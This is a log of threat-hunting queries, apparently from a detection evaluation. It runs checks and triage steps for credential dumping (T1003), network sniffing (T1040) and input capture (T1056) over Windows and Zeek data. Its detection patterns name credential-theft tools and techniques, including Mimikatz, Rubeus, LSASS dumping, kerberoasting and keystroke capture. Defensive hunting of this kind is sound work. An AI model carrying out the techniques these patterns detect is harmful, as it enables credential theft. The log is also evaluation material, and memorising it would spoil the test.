| q-224096258e | check C264 | aggregate | {"dataset": "windows.sysmon", "field": "dns.question.name", "query": "event.code:22", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 81 |  |
| q-562bacc945 | check C265 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:5156 OR event.code:5158", "time_from": null, "time_to": null, "size": 10, "sub_field": null} | 5059 |  |
| q-7533f8c99c | check C266 | search | {"dataset": "windows.other", "query": "event.code:5156 OR event.code:5158 OR event.code:5154", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 0 |  |
| q-607340c82f | check C267 | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*netsh interface*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" \| KEEP @timestamp, host.name,… | ERROR |  |
| q-d825f754b7 | check C267 (repaired) | esql | {"query": "FROM windows.powershell METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*netsh interface*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" \| KEEP @timestamp, host.name,… | ERROR |  |
| q-c175259eac | check C268 | aggregate | {"dataset": "zeek", "field": "zeek.orig_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 30, "sub_field": null} | 613 |  |
| q-ff8a0eac43 | check C269 | search | {"dataset": "windows.other", "query": "event.code:(1341 OR 1342 OR 1020 OR 1063)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-0f89539235 | check C270 | search | {"dataset": "windows.security", "query": "event.code:5156 AND network.transport:udp", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_… | 0 |  |
| q-e4f4f94468 | check C271 | aggregate | {"dataset": "windows.sysmon", "field": "destination.port", "query": "event.code:3 AND network.transport:udp", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 308 |  |
| q-ee36c63d0d | check C272 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*dhcp* OR *netsh* OR *route add*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "… | 0 |  |
| q-f55a687d52 | check C273 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:(4672 OR 4634 OR 4769 OR 4768 OR 4624)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 787 |  |
| q-b762a62498 | check C274 | search | {"dataset": "windows.security", "query": "event.code:4769 AND win.TicketEncryptionType:0x17", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-76e7dcd45c | check C275 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-375de071c5 | check C276 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*kerberos* OR *ticket* OR *kirbi* OR *Rubeus* OR *Mimikatz*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 0 |  |
| q-c51c4200f3 | check C277 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860 OR 5861)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 89 |  |
| q-fae3a64b77 | check C278 | search | {"dataset": "windows.security", "query": "event.code:4769 AND win.TicketEncryptionType:0x17", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-945bd15997 | check C279 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-e5f3207f01 | check C280 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-933f18f53d | check C281 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*krbtgt* OR *golden* OR *DCSync* OR *lsadump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.e… | 0 |  |
| q-b1acbcf39c | check C282 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860 OR 5861)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 89 |  |
| q-a5e60e5fab | check C283 | search | {"dataset": "windows.security", "query": "event.code:4769 AND win.TicketEncryptionType:0x17", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-c44e06f448 | check C284 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-cb44e71f68 | check C285 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-28eea321d5 | check C286 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*silver* OR *ticket* OR *kirbi* OR *Rubeus*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.exe… | 0 |  |
| q-d3bf446186 | check C287 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860 OR 5861)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 89 |  |
| q-cf03553e52 | check C288 | search | {"dataset": "windows.security", "query": "event.code:4769 AND win.TicketEncryptionType:0x17", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-b23708eb29 | check C289 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-4be76a4707 | check C290 | search | {"dataset": "windows.security", "query": "event.code:(4624 OR 4648 OR 4672)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 524 |  |
| q-ead7d66dd8 | check C291 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-3901db9073 | check C292 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*kerberoast* OR *SPN* OR *GetUserSPNs* OR *Rubeus*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proc… | 0 |  |
| q-761b3befd0 | check C293 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860 OR 5861)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 89 |  |
| q-d18f8b2226 | check C294 | search | {"dataset": "windows.security", "query": "event.code:4768 AND win.PreAuthType:0", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line… | 0 |  |
| q-3328a038f1 | check C295 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 14 |  |
| q-217f6f2907 | check C296 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.command_line:(*asreproast* OR *GetNPUsers* OR *Rubeus*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-6ab019c9fe | check C297 | search | {"dataset": "windows.powershell", "query": "process.command_line:(*asreproast* OR *GetNPUsers* OR *preauth*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.execu… | 0 |  |
| q-3c0b38b382 | check C298 | search | {"dataset": "windows.other", "query": "event.code:(5857 OR 5858 OR 5860 OR 5861)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 89 |  |
| q-d29a961cf4 | check C299 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-68f11e71c9 | check C300 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-ccbaabf77f | check C301 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*token* OR win.ScriptBlockText:*cookie* OR win.ScriptBlockText:*SAML*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.data… | 1 |  |
| q-e41cac392a | check C302 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-5b9c1a00c2 | check C303 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 2140 |  |
| q-d99e8ca47a | check C304 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*Cookie* OR file.path:*cookie*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-7e17a34da9 | check C305 | search | {"dataset": "windows.security", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 312 |  |
| q-c42b8beb88 | check C306 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Cookie* OR win.ScriptBlockText:*Set-Cookie* OR win.ScriptBlockText:*session*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "ev… | 1 |  |
| q-944416d6e1 | check C307 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:1 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comm… | 12 |  |
| q-3920be1bb4 | check C308 | search | {"dataset": "zeek", "query": "event.action:http", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destination.ip"… | 62 |  |
| q-7bbdac0788 | check C309 | search | {"dataset": "windows.security", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 312 |  |
| q-09ead945a4 | check C310 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-40f690b5f6 | check C311 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*SAML* OR win.ScriptBlockText:*Assertion* OR win.ScriptBlockText:*NotOnOrAfter*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "… | 0 |  |
| q-3b135d36a7 | check C312 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*SAML* OR process.command_line:*token*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-978270839b | check C313 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*saml* OR url.original:*SAML*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "pro… | 0 |  |
| q-2361ca7138 | check C314 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-618750c6ac | check C315 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-f748dcb550 | check C316 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 | F50 |
| q-0c603f3f1e | check C317 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*MFA* OR win.ScriptBlockText:*2FA* OR win.ScriptBlockText:*Authenticator*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 0 |  |
| q-abc4115d4e | check C318 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*MFA* OR process.command_line:*2FA*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a06117b554 | check C319 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*mfa* OR url.original:*auth*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proc… | 0 |  |
| q-b2f9310db4 | check C320 | search | {"dataset": "windows.security", "query": "event.code:4657 OR event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 50 |  |
| q-889dc9b3aa | check C321 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4657", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 36 |  |
| q-bff86076d2 | check C322 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:12 OR event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 78692 |  |
| q-2f40dbe8f1 | check C323 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*.pfx OR file.path:*.p12 OR file.path:*.cer OR file.path:*.crt)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-7c6dd6813d | check C324 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Export-PfxCertificate* OR win.ScriptBlockText:*certutil* OR win.ScriptBlockText:*Certificate*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "ob… | 1 |  |
| q-8952431f4a | check C325 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-754e4823a4 | check C326 | search | {"dataset": "zeek", "query": "event.action:x509 OR event.action:ssl", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.i… | 756 |  |
| q-cc69522ce5 | check C327 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 2140 |  |
| q-6c208149b8 | check C328 | search | {"dataset": "zeek", "query": "event.action:kerberos", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destination… | 35 |  |
| q-8ba11ccb91 | check C329 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-97b82b5a76 | check C330 | aggregate | {"dataset": "zeek", "field": "zeek.client", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-2cd4030936 | check C331 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-081212e38d | check C332 | search | {"dataset": "zeek", "query": "event.action:kerberos", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destination… | 35 |  |
| q-46285af7c9 | check C333 | aggregate | {"dataset": "zeek", "field": "zeek.cipher", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-3fbe88ff56 | check C334 | aggregate | {"dataset": "zeek", "field": "zeek.id_orig_h", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-c60498455a | check C335 | search | {"dataset": "zeek", "query": "event.action:kerberos", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destination… | 35 |  |
| q-c42cb4f77e | check C336 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-65cf846859 | check C337 | aggregate | {"dataset": "zeek", "field": "zeek.success", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-d647154a45 | check C338 | aggregate | {"dataset": "zeek", "field": "zeek.service", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-8ade49513a | check C339 | aggregate | {"dataset": "zeek", "field": "zeek.cipher", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-c87751550b | check C340 | aggregate | {"dataset": "zeek", "field": "zeek.client", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-ea417b2cd8 | check C341 | search | {"dataset": "zeek", "query": "event.action:kerberos", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destination… | 35 |  |
| q-5bd9a5aa0c | check C342 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-53b4442067 | check C343 | aggregate | {"dataset": "zeek", "field": "zeek.client", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-9d242aeb56 | triage T1003 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000 OR win.GrantedAccess:0x1400… | 33 | F01 |
| q-de417037ab | triage T1003 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*rundll32* OR process.executable:*procdump* OR process.executable:*mimikatz* OR process.executable:*comsvcs* OR process.command_line:*comsvcs* OR process.command_line:*MiniDump*)", "t… | 7 |  |
| q-9d8531aaa5 | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-31d7ab5950 | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-55861f583b | triage T1003 step 2 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*DumpCreds* OR win.ScriptBlockText:*comsvcs* OR win.ScriptBlockText:*procdum… | 0 |  |
| q-b8f5fbc2e8 | triage T1003 step 3 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND win.ProcessId:2976", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "process.executable", "process.command_line", "process.parent.executable", "user.name", "win.ProcessId"], "s… | 1 |  |
| q-8ae7e18893 | triage T1003 step 3 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND host.name:scranton.dmevals.local", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ScriptBlockText", "user.name", "process.command_line", "win.Path"], … | 146 |  |
| q-19b622389a | triage T1003 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None | F01, F02 |
| q-96aa221cbe | triage T1003 step 4 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None | F01 |
| q-6346f6f515 | triage T1003 step 5 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND host.name:nashua.dmevals.local AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*MiniDump* OR win.ScriptBlockText:*Dump* OR win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*Invoke-*… | 1 |  |
| q-928a3a303e | triage T1003 step 5 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectType:Process", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "event.code", "win.ObjectType", "win.ProcessName", "win.ObjectName", "win.AccessMask", "user.name",… | 6 | F01, F03 |
| q-894e1b9503 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None |  |
| q-655e08358d | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gj"} | None |  |
| q-94c0ebfa99 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-3bbd4eb17c | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItUHCTY0"} | None |  |
| q-f0e573502e | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOKBk"} | None |  |
| q-56313c4a7a | triage T1003 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.17-000001", "id": "AaFHNH1uOFchItbrYMQT"} | None |  |
| q-417e7a5062 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHNH1uOFchItQB61zZ"} | None |  |
| q-77315a436a | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaDOqAA"} | None |  |
| q-1ea20e1800 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTiZblD"} | None |  |
| q-7347bc6e51 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dd"} | None |  |
| q-1f9d19ac0b | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItaEO1dg"} | None |  |
| q-d682ecd1e4 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItZ6CoYO"} | None |  |
| q-ecd0303c8c | triage T1040 step 1 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None | F08 |
| q-529f3f7d26 | triage T1040 step 1 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt4o2y"} | None | F08 |
| q-f53e82b7cd | triage T1040 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*trace start*\" OR TO_LOWER(process.command_line) LIKE \"*capture=yes*\" OR TO_LOWER(process.command_line) LIKE \"*pktmon*\… | 1 |  |
| q-bece48beab | triage T1040 step 2 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" \| STATS c = COUNT(*) BY process.executable \| SORT c DESC \| LIMIT 40"} | 40 |  |
| q-41db6a264d | triage T1040 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE TO_LOWER(process.executable) LIKE \"*networkwatcher*\" OR TO_LOWER(process.parent.executable) LIKE \"*networkwatcher*\" OR TO_LOWER(process.command_line) LIKE \"*networkwatcher*\" \| KEE… | 30 | F08 |
| q-27ac7301c9 | triage T1040 step 3 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"7\" AND (TO_LOWER(win.ImageLoaded) LIKE \"*pcap*\" OR TO_LOWER(win.ImageLoaded) LIKE \"*npcap*\" OR TO_LOWER(win.ImageLoaded) LIKE \"*wpcap*\" OR TO_LOWER(win.ImageLoaded… | 0 |  |
| q-c5d2c37d51 | triage T1040 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"1\" AND (TO_LOWER(process.command_line) LIKE \"*logman*\" OR TO_LOWER(process.command_line) LIKE \"*pktmon*\" OR TO_LOWER(process.command_line) LIKE \"*netsh*\" OR TO_LOW… | 9 | F08 |
| q-5d0e3ddaa5 | triage T1040 step 4 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"6\" OR event.code == \"7\" \| WHERE TO_LOWER(win.ImageLoaded) LIKE \"*npcap*\" OR TO_LOWER(win.ImageLoaded) LIKE \"*pcap*\" OR TO_LOWER(win.ImageLoaded) LIKE \"*winpcap*\… | 2 | F08 |
| q-37f2b4f3cd | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-c6c479468c | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPM8kte"} | None |  |
| q-e5ce7172d7 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.17-000001", "id": "AaFHNH1uOFchItVt4o2y"} | None |  |
| q-84ba25d298 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItPE0PdZ"} | None |  |
| q-cc952a48bd | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOuYQdN"} | None |  |
| q-20cb9926df | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItO9qRCx"} | None |  |
| q-2d408d021d | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItOlQHBV"} | None |  |
| q-fd934bc824 | triage T1056 step 1 | esql | {"query": "FROM logs-windows.sysmon-default METADATA _id, _index \| WHERE event.code == \"10\" AND win.TargetImage LIKE \"*lsass*\" AND win.GrantedAccess IN (\"0x1fffff\",\"0x101001\",\"0x1f3fff\",\"0x1000000\",\"0x3000\",\"0x1400\") \| KEEP @timestamp, host.n… | 33 |  |
| q-78cd6b1a97 | triage T1056 step 1 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND win.ScriptBlockText LIKE \"*Invoke-Exfil*\" \| KEEP @timestamp, host.name, user.name, win.ScriptBlockId, win.ScriptBlockText, _id, _index"} | 2 |  |
| q-593e5d62f7 | triage T1056 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHM31uOFchItTka0Gm"} | None | F10 |
| q-4f74c6564b | triage T1056 step 2 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND event.code == \"4104\" AND (@timestamp >= \"2020-05-02T03:04:00.000Z\" AND @timestamp <= \"2020-05-02T03:10:00.000Z\") \| KEEP @timestamp,… | 75 |  |
| q-949b8dff51 | triage T1056 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZRk1CS"} | None | F09 |
| q-6e171cf957 | triage T1056 step 3 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.17-000001", "id": "AaFHNX1uOFchItZCgBha"} | None |  |
| q-c29c264534 | triage T1056 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE host.name == \"scranton.dmevals.local\" AND event.code == \"4104\" AND (win.ScriptBlockText LIKE \"*Get-Keystrokes*\" OR win.ScriptBlockText LIKE \"*GetAsyncKeyState*\" OR win.Script… | 4 | F09, F11 |
